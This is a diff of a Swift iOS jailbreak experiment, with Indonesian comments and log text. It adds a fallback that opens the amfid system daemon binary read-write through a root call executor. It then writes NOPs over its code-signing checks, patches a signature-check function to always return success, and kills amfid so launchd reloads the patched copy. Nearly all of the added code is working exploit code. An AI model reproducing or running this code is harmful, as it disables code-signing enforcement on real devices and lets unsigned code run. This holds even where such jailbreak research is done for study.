@@ -7047,31 +7047,135 @@ struct AMFIExperimentView: View {
         detail += "amfid task port: \(amfidTaskPort)\n"
 
         guard tfpRet == 0 && amfidTaskPort != 0 else {
-            detail += "❌ task_for_pid gagal.\n"
-            detail += "Kemungkinan: launchd tidak punya hak task_for_pid ke amfid.\n\n"
+            detail += "❌ task_for_pid gagal (ret=\(tfpRet)).\n\n"
 
-            // Fallback: coba langsung write via mach_vm_write dengan task port dari kernel
-            detail += "=== Fallback: Direct KRW patch amfid memory ===\n"
-            detail += "Coba baca amfid __TEXT langsung via KRW...\n"
+            // ══════════════════════════════════════════════════════════
+            // FALLBACK: Patch amfid binary ON-DISK
+            // Tulis NOP ke /usr/libexec/amfid file langsung
+            // Lalu kill amfid → launchd restart → patched version jalan
+            // ══════════════════════════════════════════════════════════
+            detail += "=== Fallback: Patch amfid ON-DISK ===\n"
+            detail += "Strategi: tulis NOP ke file /usr/libexec/amfid, lalu kill amfid.\n"
+            detail += "Launchd akan restart amfid dari disk → patched version.\n\n"
 
-            // amfid runtime text base dari Exp 84 Step 2
-            let amfidRuntimeText: UInt64 = 0x16cd60000
-            // Coba baca instruksi pertama di offset [0]
-            let testAddr = amfidRuntimeText + amfidTextOffsets[0]
-            let testVal = ds_kread32_safe(testAddr)
-            detail += "Read amfid text 0x\(String(format: "%llx", testAddr)): 0x\(String(format: "%08x", testVal))\n"
+            let amfidPath = remote_alloc_str(rc, "/usr/libexec/amfid")
 
-            if testVal == 0 {
-                detail += "❌ Tidak bisa baca amfid text via KRW (userspace VA).\n"
-                detail += "KRW hanya bisa akses kernel VA, bukan userspace VA amfid.\n\n"
-                detail += "=== Alternatif yang tersisa ===\n"
-                detail += "1. Patch amfid binary on-disk: tulis NOP ke /usr/libexec/amfid\n"
-                detail += "   Lalu kill amfid → launchd restart amfid → patched version jalan\n"
-                detail += "2. Atau: patch fungsi target (0x10001c830) di amfid\n"
-                detail += "   Ganti prologue fungsi dengan MOV W0,#0 + RET\n"
+            // Open amfid for read+write
+            let fd = RootExecutor.rcall(rc, "open", amfidPath, UInt64(O_RDWR), 0)
+            guard fd != UInt64(bitPattern: -1) else {
+                let err = remote_errno(rc)
+                detail += "❌ open(/usr/libexec/amfid, O_RDWR) gagal: errno=\(err)\n"
+                if err == 1 { detail += "  EPERM — filesystem mungkin read-only (SSV/snapshot)\n" }
+                if err == 30 { detail += "  EROFS — Read-only file system\n" }
+                detail += "\n=== Diagnosis ===\n"
+                detail += "iOS 18 rootfs di-mount read-only (SSV).\n"
+                detail += "/usr/libexec/amfid tidak bisa ditulis langsung.\n\n"
+                detail += "Jalur yang tersisa:\n"
+                detail += "  1. Remount rootfs read-write (butuh APFS snapshot manipulation)\n"
+                detail += "  2. Bind mount: copy amfid ke /var, patch, mount --bind\n"
+                detail += "  3. Patch amfid di memory via kernel (butuh bypass W^X)\n"
+                RootExecutor.rcall(rc, "free", amfidPath)
+                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
             }
 
-            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+            detail += "✅ amfid opened for R/W (fd=\(fd))\n"
+
+            // Patch setiap offset: seek + write NOP
+            // File offset = offset dari __TEXT start (karena __TEXT fileoff=0)
+            let nopBuf = mem + 0x2000
+            rc[nopBuf].setValue32(NOP)
+
+            var diskPatched = 0
+            var diskFailed = 0
+
+            for (i, offset) in amfidTextOffsets.enumerated() {
+                // Seek ke offset
+                let seekRet = RootExecutor.rcall(rc, "lseek", fd, offset, 0) // SEEK_SET=0
+                guard seekRet == offset else {
+                    diskFailed += 1
+                    continue
+                }
+
+                // Read original untuk verify
+                let readBufDisk = mem + 0x2100
+                RootExecutor.rcall(rc, "read", fd, readBufDisk, 4)
+                let original = rc[readBufDisk].value32()
+
+                // Verify CBNZ W0
+                let isCBNZ = (original >> 24) == 0x35 && (original & 0x1F) == 0
+                if !isCBNZ {
+                    if i < 3 {
+                        detail += "  [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", original)) — skip (bukan CBNZ)\n"
+                    }
+                    diskFailed += 1
+                    continue
+                }
+
+                // Seek back dan write NOP
+                RootExecutor.rcall(rc, "lseek", fd, offset, 0)
+                let writeN = RootExecutor.rcall(rc, "write", fd, nopBuf, 4)
+
+                if writeN == 4 {
+                    diskPatched += 1
+                    if diskPatched <= 5 {
+                        detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", original)) → NOP\n"
+                    }
+                } else {
+                    diskFailed += 1
+                    if diskFailed <= 3 {
+                        detail += "  ❌ [\(i)] +0x\(String(format: "%x", offset)): write gagal (ret=\(writeN))\n"
+                    }
+                }
+            }
+
+            // Juga patch fungsi signature check langsung (offset 0x1c830)
+            // MOV W0, #0 + RET = always return 0
+            let sigCheckOff: UInt64 = 0x1c830
+            RootExecutor.rcall(rc, "lseek", fd, sigCheckOff, 0)
+            rc[nopBuf].setValue32(0x52800000)     // MOV W0, #0
+            rc[nopBuf + 4].setValue32(0xD65F03C0) // RET
+            let sigWriteN = RootExecutor.rcall(rc, "write", fd, nopBuf, 8)
+            if sigWriteN == 8 {
+                diskPatched += 1
+                detail += "  ✅ +0x1c830: signature check fn → MOV W0,#0 + RET\n"
+            }
+
+            RootExecutor.rcall(rc, "close", fd)
+            RootExecutor.rcall(rc, "free", amfidPath)
+
+            if diskPatched > 5 {
+                detail += "  ... dan \(diskPatched - 5) lainnya\n"
+            }
+            detail += "\nDisk patched: \(diskPatched), failed: \(diskFailed)\n\n"
+
+            if diskPatched > 0 {
+                // Kill amfid → launchd restart dari patched binary
+                detail += "=== Kill amfid (PID \(amfidPid)) → restart patched ===\n"
+                let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9)
+                detail += "kill(\(amfidPid), SIGKILL): ret=\(killRet)\n"
+
+                // Tunggu amfid restart
+                RootExecutor.rcall(rc, "usleep", 2000000) // 2 detik
+
+                // Cek apakah amfid sudah restart
+                let newAmfid = mgr.findProc(name: "amfid")
+                if newAmfid != 0 {
+                    let newPid = ds_kread32(newAmfid + UInt64(off_proc_p_pid))
+                    detail += "✅ amfid restarted! New PID: \(newPid)\n\n"
+                    detail += "🎉🎉🎉 amfid ON-DISK PATCHED + RESTARTED! 🎉🎉🎉\n\n"
+                    detail += "→ Tap ④ Test Binary Spawn untuk verifikasi!\n"
+                    detail += "→ Jika spawn berhasil = FULL JAILBREAK!\n"
+                } else {
+                    detail += "⚠️ amfid belum restart (mungkin perlu tunggu lebih lama)\n"
+                    detail += "Coba tap ④ Test Binary Spawn setelah beberapa detik.\n"
+                }
+
+                return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+            } else {
+                detail += "❌ Tidak ada byte yang berhasil ditulis ke disk.\n"
+                detail += "Filesystem read-only atau permission denied.\n"
+                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+            }
         }
 
         detail += "✅ task_for_pid berhasil! amfid task port = \(amfidTaskPort)\n\n"
